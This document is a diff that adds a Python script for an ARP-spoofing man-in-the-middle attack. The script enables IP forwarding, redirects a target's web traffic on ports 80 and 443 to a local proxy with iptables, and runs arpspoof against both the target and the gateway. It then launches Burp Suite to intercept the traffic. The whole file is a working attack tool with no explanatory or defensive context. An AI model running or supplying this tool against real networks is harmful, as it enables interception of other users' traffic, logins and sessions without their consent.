@@ -1,0 +1,49 @@
+import os
+import sys
+import subprocess
+
+def usage():
+    print("Usage: python script.py <interface> <target> <gateway>")
+    sys.exit(1)
+
+def enable_ipv4_forwarding(enable=True):
+    value = "1" if enable else "0"
+    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
+        f.write(value)
+    print(f"IPv4 forwarding {'enabled' if enable else 'disabled'}.")
+
+def flush_iptables():
+    print("Flushing iptables...")
+    subprocess.run(["iptables", "-t", "nat", "-F"], check=True)
+
+def enable_iptables_redirection():
+    print("Enabling iptables redirection...")
+    subprocess.run(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-ports", "8080"], check=True)
+    subprocess.run(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "443", "-j", "REDIRECT", "--to-ports", "8080"], check=True)
+
+def spoof_arp(interface, target, gateway):
+    print("Starting ARP spoofing...")
+    subprocess.Popen(["gnome-terminal", "--", "arpspoof", "-i", interface, "-t", target, gateway])
+    subprocess.Popen(["gnome-terminal", "--", "arpspoof", "-i", interface, "-t", gateway, target])
+
+def start_burp_suite():
+    print("Starting Burp Suite...")
+    subprocess.run(["BurpSuiteFree"], check=True)
+
+if __name__ == "__main__":
+    if len(sys.argv) != 4:
+        usage()
+
+    interface = sys.argv[1]
+    target = sys.argv[2]
+    gateway = sys.argv[3]
+
+    try:
+        enable_ipv4_forwarding(True)
+        flush_iptables()
+        enable_iptables_redirection()
+        spoof_arp(interface, target, gateway)
+        start_burp_suite()
+    finally:
+        flush_iptables()
+        enable_ipv4_forwarding(False)
